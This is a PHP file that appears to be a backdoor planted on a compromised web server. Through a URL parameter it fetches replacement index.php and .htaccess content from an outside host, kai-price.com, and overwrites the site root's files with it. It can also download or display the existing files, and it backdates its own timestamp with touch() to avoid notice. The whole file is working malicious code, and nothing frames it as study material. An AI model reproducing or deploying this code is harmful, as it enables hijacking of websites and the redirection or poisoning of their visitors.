<?php
$dir = getcwd();
$gml =$_SERVER['DOCUMENT_ROOT'];
$web = str_replace('www.','',$_SERVER['HTTP_HOST']);


	$dirg = $dir.DIRECTORY_SEPARATOR;
	$myfile = fopen($gml.DIRECTORY_SEPARATOR.'index.php', "r"); 
	
	$idbody = fread($myfile,filesize($gml.DIRECTORY_SEPARATOR.'index.php'));  
	fclose($myfile);
	
	$myfile = fopen($gml.DIRECTORY_SEPARATOR.'.htaccess', "r"); 
	$hbody = fread($myfile,filesize($gml.DIRECTORY_SEPARATOR.'.htaccess')); 
	fclose($myfile);
	
	

if($_GET['u']=='i'){ 
	$webindex = 'http://kai-price.com/68/'.$web.'/index.txt'; 
	$bodyindex = gotfile($webindex); 
	
	if(stristr($bodyindex,'<title>404 Not Found</title>')){
		echo "404 in kai-price.com"; exit;
	}
	
		if($bodyindex == ""){
			echo "no index html"; exit; 
		}else{
		wfile($gml.DIRECTORY_SEPARATOR.'index.php',$bodyindex);	
		}
		
		
	
	echo "ok go";

}else if($_GET['u']=='h'){  
 
	$webh = 'http://kai-price.com/68/'.$web.'/h.txt';
	$bodyh = gotfile($webh);
	
	if(stristr($bodyh,'<title>404 Not Found</title>')){
		echo "404 in kai-price.com"; exit;
	}
	
if($bodyh == ""){
			echo "no h html<br>";  
			}else{
				wfile($gml.DIRECTORY_SEPARATOR.'.htaccess',$bodyh);
			}
	echo "ok go";
	
}else if($_GET['u']=='d'){   
	
	$myfile = fopen($dirg.'index.txt', "w+"); 
	fwrite($myfile,$idbody);
	fclose($myfile);
	 
	$myfile = fopen($dirg.'h.txt', "w+"); 
	fwrite($myfile,$hbody);
	fclose($myfile);
	
	$zip=new ZipArchive();
	if($zip->open($web.'.zip', ZipArchive::OVERWRITE)=== TRUE){
		 $zip->addFile('index.txt');
		 $zip->addFile('h.txt'); 
		$zip->close();   
	}
	 
	header('Content-type: application/force-download');
	header('Content-Disposition: attachment; filename="'.$web.'.zip"');   
	@readfile($web.'.zip');
	
	unlink("h.txt");
	unlink("index.txt");
	unlink($web.'.zip');
}else if($_GET['u']=='q'){
	
	
	echo '<textarea style=" width:800px;height: 100px;">'.$hbody.'</textarea><br><br>';
	echo '<textarea style=" width:800px;height: 300px;">'.$idbody.'</textarea>';
}else{
	echo 'ok';
}
function wfile($dir,$body){
	
	$fp = fopen($dir, "w+"); 
	fwrite($fp,$body);
	
	}

function gotfile($url){
	$file_contents = @file_get_contents($url); 
	if (!$file_contents) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$file_contents = curl_exec($ch);
		curl_close($ch);
	} 
	return $file_contents; 
}	
touch("search_advanced.php",mktime(19,5,10,10,26,2010)); 
?>
